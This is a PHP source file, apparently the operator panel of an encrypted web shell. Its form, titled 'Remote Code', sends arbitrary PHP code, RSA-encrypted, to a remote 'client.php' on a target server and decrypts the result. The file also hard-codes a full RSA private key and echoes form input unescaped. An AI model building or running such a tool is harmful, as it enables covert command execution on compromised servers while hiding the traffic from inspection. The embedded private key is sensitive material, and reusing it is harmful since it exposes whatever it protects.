<?php
define('POST_KEY', 'page');
$url = isset($_POST['url']) ? $_POST['url'] : 'https://example.com/client.php';
$code = isset($_POST['code']) ? $_POST['code'] : 'return "Hello, World!";';
$decrypted = '';

$server_key = '-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQC5CkJEWQxYDPoR
mukgJzf4yE6C/9NOdR4eFRY8Oobd5E2eqDEFY4jvC+P5Px3ngGl+MtD+gMhoTE+i
HkjmsKWah3z7GbbpA2upefZSEGLAdf5SQW7hFyC6Su2ZZnzWRQMklrqksTVa5cL3
WeRjo+4EXtbuIXuXANRckX2UtmN+HIqmddaOCHFsxfJmNWzhxGW+FgENtSwPncw2
yKVmaW8PDwrB8P+p0FEjbIGDpz+K/LrST0KBwT4Hi82vcifoNhjCWyVQzg1RJzoF
/+DGuNlKSmiBqse4qsovKJtdfQFxSitNp46zk32X76jM87bW7FcY82KqxXBo2/Ep
AApRE6pgTpH8nRgXKG/hpAfuBhwLtbDhWHgDdtDPz2o1CIrCbLy/flzZ7VB2wK+/
gT+cSepKifeIfRelcD+fiNiB6kNoY8p8D800zLX9IjQboS7/IsXR06N2zLF4v3Nc
1fi3R7snd7od0al3UtjIidvTOYYwIFHzZ6tvFNlIvlXJiLwnsOqZ/tiXKeBkYKL8
N2Kj7m3gFXiUqTIen+A8VdY1/PxzgHImBmZBc2xiHqOGu+Du4aPTQNdfSY+bNjKV
Wllp7IsK3PYC8BxNmjTq7tVRW7vngZMYCtN40xfb2xO4f+xd3nfZL/d4hCfvmMh6
nwTuVA60tTau5Qfq3Xmm4seAJkE4bwIDAQABAoICAErjmAZJc/F+7waJB6j3tnN9
vijOmRq708ChECq4FTVg3PlFYPGpYxY8XbvWi6fSFN/6eRNH09RCbkhSsXaML7nm
8/I8agbMV5pzvflgoFb8aj2oNdPrpFdBVAAttoCR1b/NMSTOg6WSL+IkA4dAJWin
aZ1e98IZl9kPGSBC4Ol9a7ALKRa63A0F4CD1pmeJMRRJm4uMs5RubOQPOMHGEiiq
EdSEUTTNFsmbdJ9v5Qu/VW0gnu4c45nyPwCu1u/oVQT0FpopisI5egZLlRFYZrjm
fH1ePQ7EMKf9a0Pe/+J1/iijk+Gh48bGPC8Ww/0gEfALMPekiOYnfeb2GTbPGrjG
cxISlTudo44CG3cHCTsT20IvnDuvMHhsuJi8CwL35Aw665qivdjE6WOUUv3QO1zk
EwUFrcw9zq92l0klgM2U0s8N7atkmDece1zXoiHMx4KBBk9fEgVmJ7oo0hsKZreV
GTfmsPY+Eavz+xr169hzbdefWzSCBa0vbN16EfKE+Z86b0rGEFiCVAJxD7oUW/wu
PiJrmJmf78OTWBgsgQoS/s2Tey46SvjrPZCmRcI6Ca/vr9pwipBz8KKgVF6kDeye
kVZ8XPcbrHa6qk3uxnCQRr2L7ykaIzNi0tTDOFRUbcdyVISQr4Okpi7o+dRqbrpN
mqT9L/gwwbx983hYa97BAoIBAQDxgXpZVsvlAtWA5fR6ed61bcKCYErTlePh1Rue
h+U5uMIfdR3E7lPlzN+gKekHrt/HzAR1whyPF7Kkgw5g1W/Y4O3plM5s3oapJw5K
T0BDPiJodJZoSYmwe8A3NBePz2SwZGWG7GiLmLUrmQjemhtyUkeSaLh66eJZHMLK
HxmQtUbyRKwv9DLj6XLQyn4EtlGzW0QcBIirQ1Upte34E5Gj1JDuzlhtf7WB9oCN
CLtnACksm2UD5xzXgWcYL/7ymQxWyheI6aVNIa5VipGPrg4Uh0G/nLkHyVMXTTER
I2IS8uOfPaoMFc1n/TtQH8I+cKh4OMqBMZ0UCoYFqPQ9yh75AoIBAQDEJTxLLJlW
Ml5uK2wk5iQ6En6+8al4h6LzP2rUQkP7Acm5odeVmLsD8Vjk66z5LVp40YNnec5p
6SOL5fVJK2IniQpDIS9C0DPojnywuKl1AH31Yv3V7zTlYIqV7LLmqBB+0vMq9P1W
Z3kyQi7WjUdgiCeOMn/2EWGi240bCwofApfsM4FzlJH6TozxNaHqlcUu3HzkySiK
FYO7Axl0M142j3JmxKOEY1HdgsomwKVykkW6NLL2Rf+tekHmXXgs+knDdbmfc/I5
+BK4FwydGt25QySGATsDg9XNyrPZXgJZzYCMP283DoBZswGzQ9xSH0G+ZEpQGZTu
hDIL8w2qbCSnAoIBAQC/2Kg1ohKUmNy76XB9fqRhIZD7erzWOeLt+hlXpQJ+CPwE
e0ersdtp2Ibot4JLPSq9j58XYJzJOv0JXKamW8be1UeJX1FgAKGea80ZUL1u7UPu
EHeO3qQHUzcNY084SXrl+MsCFHi0NBnvSUFXe7pD5YK/lnq+AV9yhLtkTrJDVw3F
1LGn4mguzrsLi1/yJFbgkKaZTyy2R+W2HbStdfYi2/BKFBcA3Qt18ziJUJ92IhWT
PtpO8F/j/gLEnxP66YN4yk9JzrkmfZP8lfgt2AmNWyjqqvf9bHuaLhLFV4NIJDSX
wid8NDGY4vwkGSZ37YyW/B455Qyv5/AxPNbQ4ugZAoIBAF9BQgWz9AeDUI6qMcu9
pGw7XSg3zjiFjmIZMzU/tSnqFWA8M6kn0fK5O5V4yrj8CIrSHMGcytxuZ1/iXnuZ
QQK4L66oJ/6HhB31TKK6GzmB8qm/2EwT7hlTCBqFJ+CST+h3Y7ZB4eIbQCVjNMHn
PHmpxaPt7GzAxizD+MPgWZrztHn2DXDm/vmTOilOBYMaFveKBnFJK5HbnuysNalT
5PYUNdeouUxqu3AauzeUqQR5+rjSLPMizWcfD2/jhqA5MKdmva2tLj5uthCGyQ5m
5LS64breUB2F4cgeH7d5SyT3gu0ZRVZ0iWqGX1YCp7WODmx64ggCVGx88J0S/Vj9
SdMCggEBALptk3w8CHEhn+E2pLXvohfoJWsUBrJ3tsZvlh+0+w9wOYZ2aWECS+P2
bprqTaCPx1XDhiMpXxd61xSCDGKXY7dMCyOQpGga8AJyaiVRaolxxR9LREAfK7v4
vnOOQs4pPrZIRaT621WbpsnhBVPNmLjrPiocnEepoyU+IEewlBcvfzduuBcH+h/V
ydgkeDOIRzdzezMsr9TOQXbMDkV2bdsOQxxbINbYV8RQRaYNGHJtuK+ixOkuHvE/
3jI3CfeVblxBXprF0kMiPtRWE3lzPUJFUAjfY4DmrKf7eahs6ATTTYJ4y603nyYa
wc3H6v5T9/3iZSMVhwJ9UtfOr5jz6mc=
-----END PRIVATE KEY-----';
$client_pub = '-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2i3GUqQZzArEVwVeiUCI
T2N+s5Y9mCeH0fcD0b0llIErzRRrLDjmhPco94cY7C3+I+RoF0XdsJHV/nVlA4l8
xZL6Frypd3xTeDvHx9Gk4B64J6sI4zZjpnQYPscoQ10oUAJwMDq7aEWZoX90LTjG
CT5+HrQqaePkVf6nyXjrKHiOUY9hLEDCf4UGoTzTYDCeBr8oSZlhNYBf9yfnY1mH
6Id7XaV7yaiGAvmyNkZSDD0yKQ8bFdScdViViIP+ZJgnKMXCn8snA5WSiddxf+kr
g18blYxbkOHZ6U0OzWV6j3l9YBO1uqCF2iKhopT8Lb9SGlcpAXkBZB+gDGgC3C60
vem7btgr2M86ljwlWJvYlOq6IfqT75UuLZ8xQqg3KiI+RH4I0qo9eFzpHgfoMjmx
JZhXZ48z8SKBF0AfltTSe4gGqFFRmHz0mb1M/b6r+hKR8ONiKy+cGvsoaIZUuoaC
rcX9fwobl2og+Fs5GucqLKHj23OWgX9DHJ/U8HTiPZY46UnM47WiGtFhvyEPH5Gp
QpcMgRB6lCZGkeiWN52f/CvCjoT9qyh8Ovo64iM69k6C9Aj3HWg74LDYlGeRxSvX
lQk41JSNfgaQ1h+Ii8l839JiSCXVWeK4Mj4mmeSr9KVXkKbX9aa1ZQDqyUYjloV3
D3uBj7TAR09T0GsgaVZoLvUCAwEAAQ==
-----END PUBLIC KEY-----';

if (isset($_POST['code'])) {
    if (!$encrypted = ssl_encrypt($code, $client_pub)) {
        die('Server - encrypt failed');
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array(POST_KEY => $encrypted)));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $encryptedData = curl_exec($ch);
    $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if (intval($status) !== 200) {
        die('Client Error: ' . $status . ' ' . $encryptedData);
    }

    if (!$priKey = openssl_pkey_get_private($server_key)) {
        die('Server - loading private key failed');
    }

    if (!$decrypted = ssl_decrypt($encryptedData, $priKey)) {
        die('Server - decrypt failed');
    }
}


function ssl_encrypt($source, $pem)
{
    $bits = ssl_getbits($pem);
    $encrypted = '';
    $cursor = 0;
    $blocksize = $bits / 8 - 42;

    while ($data = substr($source, $cursor, $blocksize)) {
        set_time_limit(10);
        error_clear_last();
        openssl_public_encrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
        if (!empty(error_get_last())) {
            return false;
        }
        $encrypted .= $blockdata;
        $cursor += $blocksize;
    }

    return base64_encode($encrypted);
}

function ssl_decrypt($source, $pem)
{
    $source = base64_decode($source);
    $bits = ssl_getbits($pem);
    $decrypted = '';
    $cursor = 0;
    $blocksize = $bits / 8;

    while ($data = substr($source, $cursor, $blocksize)) {
        set_time_limit(10);
        error_clear_last();
        openssl_private_decrypt($data, $blockdata, $pem, OPENSSL_PKCS1_OAEP_PADDING);
        if (!empty(error_get_last())) {
            return false;
        }
        $decrypted .= $blockdata;
        $cursor += $blocksize;
    }

    return $decrypted;
}

function ssl_getbits($pem)
{
    $key = openssl_pkey_get_public($pem);
    if (is_resource($key)) {
        $keyinfo = (object) openssl_pkey_get_details($key);
        return $keyinfo->bits;
    }

    $key = openssl_pkey_get_private($pem);
    if (is_resource($key)) {
        $keyinfo = (object) openssl_pkey_get_details($key);
        return $keyinfo->bits;
    }

    return false;
}

?>
<html>

<head>
    <title>Remote Code</title>
</head>

<body>
    <h1>Remote Code</h1>
    <form method="post">
        <h2>Target URL:</h2>
        <input type="url" name="url" value="<?php echo $url; ?>" style="width:400px;"><br>
        <h2>PHP Code:</h2>
        <textarea name="code" rows="10" cols="50"><?php echo $code; ?></textarea><br>
        <input type="submit" value="Submit">
    </form>
    <h2>Result:</h2>
    <pre><?php echo $decrypted; ?></pre>
</body>

</html>